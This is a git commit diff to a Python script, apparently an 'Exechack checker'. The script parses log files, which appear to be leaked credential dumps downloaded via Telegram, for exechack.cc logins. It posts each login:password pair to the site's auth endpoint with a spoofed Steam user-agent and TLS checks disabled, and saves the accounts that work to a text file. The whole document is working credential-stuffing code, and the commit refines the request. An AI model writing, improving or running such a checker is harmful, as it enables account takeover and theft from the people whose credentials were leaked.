240734bc554a0a058f7d4608bc8062c2159e00b5
F-user <157841614+Fae1337@users.noreply.github.com>
2025-06-13 16:07:57 +0300

    Update main.py

--- checker/main.py
+++ checker/main.py
@@ -5,36 +5,39 @@ from colorama import Fore
 def main(folder_logs,log_file):
     with open(f"{folder_logs}/{log_file}","r",encoding="utf-8") as content_file:
         print(Fore.CYAN + f"Working as {log_file}")
-        lines = content_file.readlines()
-        for line in lines:
+        for line in content_file:
             if "exechack.cc" in line:
                 line = line.replace("/",":").replace("|",":").split(":")
                 login = line[-2]
                 password = line[-1].replace("\n","")
 
-                r = req.post("https://exechack.cc/forum/authq.php",
+                r = req.post("https://exechack.cc/forum/l107.php",
                 data={
                     "password": f"{password}",
                     "username": f"{login}",
-                    "hwid": "{execlox}",
-                    "gay": "no"
+                    "hwid":"hyeta",
+                    "gay":"no"
                 },
                 headers={
-                    'Content-Type': 'application/x-www-form-urlencoded',
                     "user-agent": "Valve/Steam HTTP Client 1.0 (4000)",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Host": "exechack.cc",
+                    "Accept": "text/html,*/*;q=0.9",
                     "accept-charset": "ISO-8859-1,utf-8,*;q=0.7",
                     "Accept-Encoding": "identity",
-                })
+                    "Content-Length": "86"
+                },verify=False)
                 if r.text not in ["Account not found","Subscription not found"]:
                     print(Fore.GREEN + f"[Account with subscription was found] {login}:{password} - {r.text}")
 
                     with open("validate_acces.txt","a",encoding="utf-8") as validate:
-                        validate.write(f"\n{login}:{password}")
+                        validate.write(f"{login}:{password}\n")
                 else:
+                    print("Not valid")
                     continue
 
 if __name__ == "__main__":
-    folder = "C:/Users/Computer/Downloads/Telegram Desktop"
+    folder = "C:/Users/konst/Downloads/Telegram Desktop"
     try:
         print("Exechack checker / Version: 27052025\n"
               "github: https://github.com/Fae1337/exechack-checker\n")
